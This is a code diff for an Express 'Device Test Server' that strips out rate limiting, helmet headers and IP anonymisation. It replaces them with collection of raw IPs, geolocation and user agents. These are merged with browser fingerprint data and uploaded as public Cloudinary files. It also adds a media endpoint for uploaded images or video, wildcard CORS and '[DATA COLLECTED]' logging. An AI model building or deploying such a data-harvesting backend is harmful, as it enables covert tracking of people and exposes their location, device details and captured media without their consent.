@@ -1,84 +1,114 @@
 const express = require('express');
 const cloudinary = require('cloudinary').v2;
-const rateLimit = require('express-rate-limit');
-const helmet = require('helmet');
-const CryptoJS = require('crypto-js');
+const geoip = require('geoip-lite');
 
-// Security configurations
-const app = express();
-app.use(helmet());
-app.use(express.json({ limit: '10mb' }));
-
-// Rate limiting
-const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 minutes
-  max: 100 // limit each IP to 100 requests per windowMs
-});
-app.use(limiter);
-
-// Cloudinary config
+// Configure Cloudinary
 cloudinary.config({
-  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
-  api_key: process.env.CLOUDINARY_API_KEY,
-  api_secret: process.env.CLOUDINARY_API_SECRET,
-  secure: true
+  cloud_name: process.env.CLOUDINARY_CLOUD_NAME || process.env.CLOUD_NAME,
+  api_key: process.env.CLOUDINARY_API_KEY || process.env.API_KEY,
+  api_secret: process.env.CLOUDINARY_API_SECRET || process.env.API_SECRET
 });
 
-// Privacy middleware
+const app = express();
+
+// Middleware
+app.use(express.json({ limit: '50mb' }));
+app.use(express.static('public'));
+
+// CORS middleware
 app.use((req, res, next) => {
-  // Anonymize IPs
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  req.anonymizedIp = CryptoJS.SHA256(ip).toString(CryptoJS.enc.Hex).substring(0, 16);
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
   next();
 });
 
+// Utility Functions
+function getClientIp(req) {
+  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+         req.ip;
+}
+
+function getClientInfo(req) {
+  const ip = getClientIp(req);
+  const geo = geoip.lookup(ip);
+  
+  return {
+    ip,
+    geo: geo ? {
+      country: geo.country,
+      city: geo.city
+    } : null,
+    userAgent: req.headers['user-agent'],
+    timestamp: new Date().toISOString()
+  };
+}
+
+function logDataCollection(type, data) {
+  console.log(`[DATA COLLECTED] ${type} from ${data.ip}`);
+}
+
+async function uploadToCloudinary(data, folderPath) {
+  const base64Data = Buffer.from(JSON.stringify(data)).toString('base64');
+  return await cloudinary.uploader.upload(
+    `data:application/json;base64,${base64Data}`,
+    {
+      folder: folderPath,
+      resource_type: 'raw',
+      format: 'json'
+    }
+  );
+}
+
 // Routes
-app.get('/get-ip', (req, res) => {
-  res.json({ anonymizedIp: req.anonymizedIp });
+app.get('/', (req, res) => {
+  res.json({
+    status: 'active',
+    message: 'Device Test Server Running',
+    timestamp: new Date().toISOString()
+  });
 });
 
 app.post('/collect-fingerprint', async (req, res) => {
   try {
+    const clientInfo = getClientInfo(req);
     const { data } = req.body;
-    
-    // Additional anonymization
-    const fingerprintData = {
-      ...data,
-      timestamp: new Date().toISOString(),
-      sessionId: CryptoJS.SHA256(Date.now().toString()).toString(),
-      ip: req.anonymizedIp
-    };
 
-    // Upload to Cloudinary with 30-day retention
-    const result = await cloudinary.uploader.upload(
-      JSON.stringify(fingerprintData),
-      {
-        folder: 'fingerprints',
-        resource_type: 'auto',
-        type: 'private',
-        overwrite: false,
-        invalidate: true
-      }
+    const result = await uploadToCloudinary(
+      { ...clientInfo, ...data },
+      'fingerprints'
     );
 
-    res.json({ 
-      success: true,
-      message: 'Data stored securely',
-      dataId: result.public_id 
-    });
+    logDataCollection('FINGERPRINT', clientInfo);
+    res.json({ success: true, url: result.secure_url });
   } catch (error) {
-    console.error('Upload error:', error);
-    res.status(500).json({ error: 'Data processing failed' });
+    console.error('Fingerprint error:', error);
+    res.status(500).json({ error: 'Failed to save fingerprint' });
+  }
+});
+
+app.post('/collect-media', async (req, res) => {
+  try {
+    const { data, metadata } = req.body;
+    const result = await cloudinary.uploader.upload(data, {
+      folder: 'media',
+      resource_type: metadata.media_type === 'image' ? 'image' : 'video'
+    });
+
+    res.json({ success: true, url: result.secure_url });
+  } catch (error) {
+    console.error('Media upload error:', error);
+    res.status(500).json({ error: 'Failed to save media' });
   }
 });
 
 // Error handling
-app.use((err, req, res, next) => {
-  console.error(err.stack);
-  res.status(500).send('Privacy-focused error response');
+app.use((error, req, res, next) => {
+  console.error('Server error:', error);
+  res.status(500).json({ error: 'Internal server error' });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Secure server running on port ${PORT}`);
+  console.log(`Server running on port ${PORT}`);
 });
